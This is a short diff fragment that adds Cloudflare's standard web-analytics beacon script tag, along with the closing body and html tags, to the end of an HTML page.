+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"ec4cae7459774bbab185e9a996c9c541","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+
+</html>
